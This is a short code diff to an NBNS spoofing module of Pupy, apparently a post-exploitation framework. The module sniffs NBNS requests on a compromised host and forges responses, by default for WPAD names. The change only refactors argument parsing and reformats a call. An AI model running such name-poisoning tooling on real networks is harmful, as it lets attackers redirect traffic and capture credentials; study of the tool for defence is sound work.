@@ -15,20 +15,22 @@ __class_name__="NbnsSpoofModule"
 class NbnsSpoofModule(PupyModule):
     """ sniff for NBNS requests and spoof NBNS responses """
 
-    max_clients=1
     dependencies=['scapy', 'nbnsspoof']
 
-    def init_argparse(self):
-        self.arg_parser = PupyArgumentParser(prog='nbnsspoof.py', description=self.__doc__)
-        self.arg_parser.add_argument("-i", "--iface", default=None, help="change default iface")
-        self.arg_parser.add_argument("--timeout", type=int, default=300, help="stop the spoofing after N seconds (default 300)")
-        self.arg_parser.add_argument("--regex", default=".*WPAD.*", help="only answer for requests matching the regex (default: .*WPAD.*)")
-        self.arg_parser.add_argument("srcmac", help="source mac address to use for the responses")
-        self.arg_parser.add_argument("ip", help="IP to spoof")
+    @classmethod
+    def init_argparse(cls):
+        cls.arg_parser = PupyArgumentParser(prog='nbnsspoof.py', description=cls.__doc__)
+        cls.arg_parser.add_argument("-i", "--iface", default=None, help="change default iface")
+        cls.arg_parser.add_argument("--timeout", type=int, default=300, help="stop the spoofing after N seconds (default 300)")
+        cls.arg_parser.add_argument("--regex", default=".*WPAD.*", help="only answer for requests matching the regex (default: .*WPAD.*)")
+        cls.arg_parser.add_argument("srcmac", help="source mac address to use for the responses")
+        cls.arg_parser.add_argument("ip", help="IP to spoof")
 
 
     def run(self, args):
         init_winpcap(self)
 
         with redirected_stdo(self):
-            self.client.conn.modules['nbnsspoof'].start_nbnsspoof(args.ip, args.srcmac, timeout=args.timeout, verbose=True, interface=args.iface, name_regexp=args.regex)
+            self.client.conn.modules['nbnsspoof'].start_nbnsspoof(
+                args.ip, args.srcmac, timeout=args.timeout, verbose=True,
+                interface=args.iface, name_regexp=args.regex)
